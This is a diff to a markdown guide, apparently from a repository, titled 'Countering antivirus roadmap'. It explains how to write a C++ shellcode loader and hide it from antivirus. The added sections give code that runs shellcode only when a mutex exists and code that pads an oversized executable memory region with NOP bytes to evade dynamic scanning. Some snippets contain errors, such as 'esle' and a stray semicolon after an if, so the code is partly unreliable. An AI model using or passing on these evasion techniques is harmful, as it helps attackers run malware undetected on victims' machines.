@@ -1,7 +1,7 @@
 # Countering antivirus roadmap
 
 Below I will outline several ways to write a shellcode loader in memory and how to hide it from antivirus on C++.
-
+[Allocating](#Allocating)
 ## Shellcode encryption
 The simplest and most important way to hide the load is shellcode encryption , this will help bypass static analysis of your file.
 You can use both simple xor and more complex encryption methods such as rc4 , etc .
@@ -45,7 +45,7 @@ for example:
   
   if (res != NULL )
   {
-    //some code
+    //exec shellcode
   }
   return 0;
 ```
@@ -63,4 +63,43 @@ for example:
   } 
   return 0;
  } 
+```
+
+## Сhecking mutex before launching
+
+You can start the program execution process only if a certain mutex is found in the system. If you try to create an existing mutex, the process throws an error.
+
+for example:
+```
+ HANDLE mutex;
+ mutex = CreateMutex( NULL, TRUE, "MY_MUTEX");
+ 
+ if ( GetLastError() == ERROR_ALREADY_EXIST );
+ {
+  // exec shellcode
+ }
+ esle 
+ {
+  startExe("my_proc.exe");
+  Sleep(1000);
+ }
+ return 0;
+```
+
+## <a name="Allocating">Allocating a large amount of memory for shellcode</a>
+
+With dynamic program analysis, antiviruses analyze the allocated memory, but they can analyze a certain amount of memory. you can allocate more memory than is necessary to write the silk code and write the first part, which will be analyzed by antivir with empty bytes.
+
+for example:
+```
+ char *ex = VirtualAlloc(NULL, sizeof(shellcode)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+ char *ex2 = ex + sizeof(shellcode);
+ memcpy(ex2, shellcode, sizeof(shellcode));
+ 
+ for( int i=0; i<=sizeof(shellcode)-1; i++)
+ {
+  ex[i] = 0x90;
+ }
+ 
+ ((void(*)())ex)();
 ```
